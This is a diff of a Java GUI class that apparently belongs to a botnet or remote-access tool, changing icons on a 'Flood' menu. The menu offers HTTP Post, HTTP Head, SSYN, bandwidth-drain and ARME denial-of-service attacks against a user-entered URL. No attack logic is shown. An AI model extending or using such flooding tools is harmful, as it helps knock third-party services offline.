@@ -1161,11 +1161,11 @@ public class Frame extends BaseFrame {
 				}
 			}
 		});
-		mntmHttpPostFlood.setIcon(new ImageIcon(Frame.class.getResource("/icons/post_flood.png")));
+		mntmHttpPostFlood.setIcon(new ImageIcon(Frame.class.getResource("/icons/http_flood.png")));
 		mnFlood.add(mntmHttpPostFlood);
 
 		JMenuItem mntmHttpHeadFlood = new JMenuItem("HTTP Head flood");
-		mntmHttpHeadFlood.setIcon(new ImageIcon(Frame.class.getResource("/icons/wallet.png")));
+		mntmHttpHeadFlood.setIcon(new ImageIcon(Frame.class.getResource("/icons/http_flood.png")));
 		mntmHttpHeadFlood.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				String target = Utils.showDialog("HTTP Head flood", "Enter URL to flood");
@@ -1222,7 +1222,7 @@ public class Frame extends BaseFrame {
 				}
 			}
 		});
-		mntmSsynFlood.setIcon(new ImageIcon(Frame.class.getResource("/icons/ssyn_flood.png")));
+		mntmSsynFlood.setIcon(new ImageIcon(Frame.class.getResource("/icons/rapid_flood.png")));
 		mnFlood.add(mntmSsynFlood);
 
 		JMenuItem mntmBandwidthDrain = new JMenuItem("Bandwidth drain");
@@ -1251,7 +1251,7 @@ public class Frame extends BaseFrame {
 				}
 			}
 		});
-		mntmBandwidthDrain.setIcon(new ImageIcon(Frame.class.getResource("/icons/drain_flood.png")));
+		mntmBandwidthDrain.setIcon(new ImageIcon(Frame.class.getResource("/icons/antivirus.png")));
 		mnFlood.add(mntmBandwidthDrain);
 
 		JMenuItem mntmArme = new JMenuItem("ARME");
@@ -1287,7 +1287,7 @@ public class Frame extends BaseFrame {
 				}
 			}
 		});
-		mntmArme.setIcon(new ImageIcon(Frame.class.getResource("/icons/flood_arme.png")));
+		mntmArme.setIcon(new ImageIcon(Frame.class.getResource("/icons/arme_flood.png")));
 		mnFlood.add(mntmArme);
 		popupMenu.addSeparator();
 
